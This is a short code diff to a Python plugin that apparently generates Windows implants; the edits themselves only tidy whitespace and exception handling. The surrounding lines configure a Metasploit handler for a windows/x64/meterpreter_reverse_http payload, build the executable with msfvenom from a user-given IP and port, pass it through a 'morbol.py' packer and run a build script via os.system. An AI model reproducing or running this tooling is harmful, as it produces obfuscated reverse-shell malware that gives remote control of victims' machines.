@@ -8,7 +8,7 @@ USAGE = 'ip port'
 NARGS = [2, 2]
 LANG = 'go'
 
-EXEC  = '''
+EXEC = '''
 use exploit/multi/handler
 set payload windows/x64/meterpreter_reverse_http
 set lhost 0.0.0.0
@@ -25,11 +25,11 @@ msfvenom -a x64 -p windows/x64/meterpreter_reverse_http LHOST=ARG1 LPORT=ARG2 -f
 def g(_, args, dst, url):
     try:
         _ = ipaddress.ip_address(args[0])
-    except:
+    except Exception as e:
         raise Exception('Not an IP address')
     try:
         lport = int(args[1])
-    except:
+    except Exception as e:
         raise Exception('Invalid number')
     if 1 > lport or 65535 < lport:
         raise Exception('Invalid port number')
@@ -46,7 +46,6 @@ def g(_, args, dst, url):
             'cp -R /usr/src/morbol/* .',
             'python3 ./morbol.py ./msf.exe ./{} >/dev/null'.format(out),
         ]))
-
 
     os.system('/bin/sh "{}/build.sh"'.format(dst))
 
